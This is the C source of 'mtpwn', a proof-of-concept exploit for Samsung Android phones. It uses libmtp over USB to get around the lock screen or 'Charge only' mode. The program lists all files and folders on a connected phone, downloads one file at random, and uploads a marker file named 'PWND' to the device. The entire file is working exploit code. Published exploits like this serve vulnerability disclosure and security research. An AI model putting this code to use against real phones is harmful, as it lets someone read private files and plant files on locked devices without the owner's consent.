/*
 *  mtpwn - PoC exploit for a vulnerability of Samsung's Android
 *          phones that allows an attacker to access phone storages
 *          via USB, bypassing lock screen and/or "Charge only" mode.
 *          It requires libmtp.
 *
 *  Copyright (C) 2017  Salvatore Mesoraca <s.mesoraca16@gmail.com>
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <libmtp.h>

#define MAX_PATH 1024

static void walk(char *fname,
		 LIBMTP_file_t *files,
		 LIBMTP_folder_t *folders,
		 char **flist,
		 size_t nmem,
		 ssize_t *idx,
		 ssize_t pidx)
{
	size_t cidx = *idx;
	size_t fidx;

	if (folders == NULL || cidx+1 >= nmem)
		return;
	cidx = ++(*idx);
	flist[cidx] = malloc(sizeof(char)*MAX_PATH);
	if (pidx == -1)
		snprintf(flist[cidx],
			 MAX_PATH,
			 "%s/%x/%s/",
			 fname,
			 folders->storage_id,
			 folders->name);
	else
		snprintf(flist[cidx],
			 MAX_PATH,
			 "%s%s/",
			 flist[pidx],
			 folders->name);

	walk(fname, files, folders->child, flist, nmem, idx, cidx);
	walk(fname, files, folders->sibling, flist, nmem, idx, pidx);

	while (files != NULL) {
		if (files->parent_id == folders->folder_id &&
		    folders->storage_id == files->storage_id) {
			fidx = ++(*idx);
			if (fidx >= nmem)
				return;
			flist[fidx] = malloc(sizeof(char)*MAX_PATH);
			snprintf(flist[fidx],
				 MAX_PATH,
				 "%s%s",
				 flist[cidx],
				 files->filename);
		} else if (cidx == 0 && files->parent_id == 0) {
			fidx = ++(*idx);
			if (fidx >= nmem)
				return;
			flist[fidx] = malloc(sizeof(char)*MAX_PATH);
			snprintf(flist[fidx],
				 MAX_PATH,
				 "%s/%x/%s",
				 fname,
				 files->storage_id,
				 files->filename);
		}
		files = files->next;
	}
}

static size_t folders_count(LIBMTP_folder_t *folders)
{
	size_t c = 1;

	if (folders == NULL)
		return 0;
	c += folders_count(folders->child);
	c += folders_count(folders->sibling);
	return c;
}

static size_t files_count(LIBMTP_file_t *files)
{
	size_t c = 0;

	while (files != NULL) {
		files = files->next;
		++c;
	}
	return c;
}
static size_t approx_count(LIBMTP_file_t *files, LIBMTP_folder_t *folders)
{
	size_t c = 0;

	c += files_count(files);
	c += folders_count(folders);
	return c;
}

static int pathcmp(const void *a, const void *b)
{
	return strcmp(*((char **)a), *((char **)b));
}

static void destroy(char **fname,
		    LIBMTP_file_t **files,
		    LIBMTP_folder_t **folders,
		    char ***flist,
		    size_t nmem)
{
	int i;
	LIBMTP_file_t *fs = *files, *tmp;
	char **fl = *flist;

	free(*fname);
	*fname = NULL;

	while (fs != NULL) {
		tmp = fs;
		fs = fs->next;
		LIBMTP_destroy_file_t(tmp);
	}
	*files = NULL;

	LIBMTP_destroy_folder_t(*folders);
	*folders = NULL;

	for (i = 0; i < nmem; ++i)
		free(fl[i]);
	if (nmem)
		free(fl);
	*flist = NULL;
}

int main(int argc, char *argv[])
{
	char *fname;
	ssize_t idx;
	size_t fcount = 0, reals, i;
	char **flist;
	LIBMTP_mtpdevice_t *device_list, *device;
	LIBMTP_file_t *files, *f2;
	LIBMTP_folder_t *folders;
	LIBMTP_file_t *newfile;

	srand(time(NULL));
	LIBMTP_Init();

	switch (LIBMTP_Get_Connected_Devices(&device_list)) {
	case LIBMTP_ERROR_NONE:
		break;
	case LIBMTP_ERROR_NO_DEVICE_ATTACHED:
		fprintf(stderr, "%s: no devices found\n", argv[0]);
		return 0;
	case LIBMTP_ERROR_CONNECTING:
		fprintf(stderr,
			"%s: There has been an error connecting\n",
			argv[0]);
		return 1;
	case LIBMTP_ERROR_MEMORY_ALLOCATION:
		fprintf(stderr, "%s: Memory Allocation Error\n", argv[0]);
		return 1;
	case LIBMTP_ERROR_GENERAL:
	default:
		fprintf(stderr, "%s: Unknown error\n", argv[0]);
		return 1;
	}

	printf("\n\nFiles list:\n");
	for (device = device_list; device != NULL; device = device->next) {
		fname = LIBMTP_Get_Friendlyname(device);
		if (fname == NULL)
			fname = strdup("NONAME");
		folders = LIBMTP_Get_Folder_List(device);
		files = LIBMTP_Get_Filelisting_With_Callback(device,
							     NULL,
							     NULL);
		if (folders == NULL && files == NULL) {
			fprintf(stderr, "Nothing to see here.\n");
			LIBMTP_Dump_Errorstack(device);
			LIBMTP_Clear_Errorstack(device);
		} else {
			fcount = approx_count(files, folders);
			flist = calloc(fcount, sizeof(char *));
			idx = -1;
			walk(fname, files, folders, flist, fcount, &idx, -1);
			reals = 0;
			while (reals < fcount)
				if (flist[reals])
					++reals;
				else
					break;
			qsort(flist, reals, sizeof(char *), pathcmp);
			for (i = 0; i < reals; ++i)
				printf("%s\n", flist[i]);
			reals = files_count(files);
			reals = rand()%reals;
			f2 = files;
			while (f2 != NULL && reals > 0) {
				f2 = f2->next;
				--reals;
			}
			for (i = 0; i < strlen(f2->filename); ++i)
				if (f2->filename[i] == '/')
					f2->filename[i] = '_';
			if (LIBMTP_Get_File_To_File(device,
						    f2->item_id,
						    f2->filename,
						    NULL,
						    NULL))
				fprintf(stderr, "\nError getting file.\n");
			else
				printf("\nDownloaded file: %s\n",
				       f2->filename);
			newfile = LIBMTP_new_file_t();
			newfile->filename = strdup("PWND");
			newfile->filesize = 0;
			newfile->filetype = LIBMTP_FILETYPE_UNKNOWN;
			newfile->storage_id = f2->storage_id;
			newfile->parent_id = 0;
			if (LIBMTP_Send_File_From_File(device,
						       argv[0],
						       newfile,
						       NULL,
						       NULL))
				fprintf(stderr, "\nError sending file.\n");
			else
				printf("\nUploaded file PWND on storage %x.\n",
				       f2->storage_id);
			LIBMTP_destroy_file_t(newfile);
		}
		destroy(&fname, &files, &folders, &flist, fcount);
	}

	LIBMTP_Release_Device_List(device_list);
	return 0;
}
